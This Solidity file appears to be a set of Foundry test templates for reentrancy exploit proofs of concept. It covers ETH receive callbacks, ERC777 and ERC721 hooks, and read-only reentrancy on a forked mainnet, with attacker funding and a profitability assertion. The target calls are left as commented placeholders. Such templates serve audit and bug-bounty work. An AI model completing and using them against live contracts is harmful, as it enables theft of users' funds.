// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "../foundry/base_test.sol";

/**
 * @title ReentrancyPoC
 * @notice Template for reentrancy exploit PoCs
 *
 * USAGE:
 * 1. Replace TARGET_CONTRACT with actual vulnerable contract
 * 2. Replace VULNERABLE_FUNCTION with the function to exploit
 * 3. Implement the callback logic in receive() or specific callback
 * 4. Run: forge test --match-test test_reentrancy -vvvv
 */
abstract contract ReentrancyPoC is BaseExploitTest {
    // === REPLACE THESE ===
    // address constant TARGET = address(0x...);
    // IVulnerable target;

    // Attack state
    uint256 internal attackCount;
    uint256 internal maxReentrances;

    function setUp() public virtual {
        // Fork mainnet at specific block for reproducibility
        // vm.createSelectFork("mainnet", BLOCK_NUMBER);

        // Setup target
        // target = IVulnerable(TARGET);

        // Fund attacker
        _dealETH(ATTACKER, 10 ether);
    }

    /// @notice Main exploit entry point
    function test_reentrancy() public asAttacker trackProfit {
        console.log("=== Starting Reentrancy Exploit ===");
        console.log("Attacker:", ATTACKER);
        console.log("Initial ETH:", ATTACKER.balance / 1e18);

        // Step 1: Initial setup (deposit, stake, etc.)
        _setupAttack();

        // Step 2: Trigger the vulnerable function
        attackCount = 0;
        maxReentrances = 5; // Adjust based on gas limits
        _triggerVulnerableFunction();

        // Step 3: Finalize (withdraw remaining, etc.)
        _finalizeAttack();

        // Verify profit
        assertGt(ATTACKER.balance, 10 ether, "Exploit should be profitable");
    }

    /// @notice Setup before attack (deposits, approvals, etc.)
    function _setupAttack() internal virtual {
        // Example: Deposit initial funds
        // target.deposit{value: 1 ether}();
    }

    /// @notice Trigger the vulnerable function
    function _triggerVulnerableFunction() internal virtual {
        // Example: Call withdraw that sends ETH
        // target.withdraw(1 ether);
    }

    /// @notice Called when ETH is received - implement reentrancy logic
    receive() external payable virtual {
        if (attackCount < maxReentrances) {
            attackCount++;
            console.log("Reentering... count:", attackCount);
            // Reenter the vulnerable function
            // target.withdraw(1 ether);
        }
    }

    /// @notice Finalize after reentrancy is done
    function _finalizeAttack() internal virtual {
        // Clean up, withdraw any remaining funds
    }
}

/**
 * @title ERC777ReentrancyPoC
 * @notice Template for ERC777 tokensReceived callback reentrancy
 */
abstract contract ERC777ReentrancyPoC is BaseExploitTest {
    uint256 internal attackCount;
    uint256 internal maxReentrances;

    /// @notice ERC777 callback - implement reentrancy here
    function tokensReceived(
        address operator,
        address from,
        address to,
        uint256 amount,
        bytes calldata userData,
        bytes calldata operatorData
    ) external virtual {
        if (attackCount < maxReentrances) {
            attackCount++;
            console.log("ERC777 reentering... count:", attackCount);
            // Reenter vulnerable function
        }
    }
}

/**
 * @title ERC721ReentrancyPoC
 * @notice Template for ERC721 onERC721Received callback reentrancy
 */
abstract contract ERC721ReentrancyPoC is BaseExploitTest {
    uint256 internal attackCount;
    uint256 internal maxReentrances;

    /// @notice ERC721 callback - implement reentrancy here
    function onERC721Received(
        address operator,
        address from,
        uint256 tokenId,
        bytes calldata data
    ) external virtual returns (bytes4) {
        if (attackCount < maxReentrances) {
            attackCount++;
            console.log("ERC721 reentering... count:", attackCount);
            // Reenter vulnerable function
        }
        return this.onERC721Received.selector;
    }
}

/**
 * @title ReadOnlyReentrancyPoC
 * @notice Template for read-only reentrancy (stale view during callback)
 */
abstract contract ReadOnlyReentrancyPoC is BaseExploitTest {
    /// @notice Exploit read-only reentrancy
    function test_readOnlyReentrancy() public asAttacker trackProfit {
        console.log("=== Starting Read-Only Reentrancy Exploit ===");

        // Step 1: Record the "correct" price/value before
        // uint256 correctValue = target.getVirtualPrice();

        // Step 2: During callback, the view function returns stale data
        // This is exploited in protocols that read from other protocols
        _triggerCallback();

        // Step 3: Profit from price discrepancy
    }

    function _triggerCallback() internal virtual {
        // Trigger a function that makes external call with callback
    }

    receive() external payable virtual {
        // During this callback, view functions may return stale data
        // Read the manipulated value and exploit it
        // uint256 manipulatedValue = target.getVirtualPrice();
        // Borrow against inflated collateral, etc.
    }
}
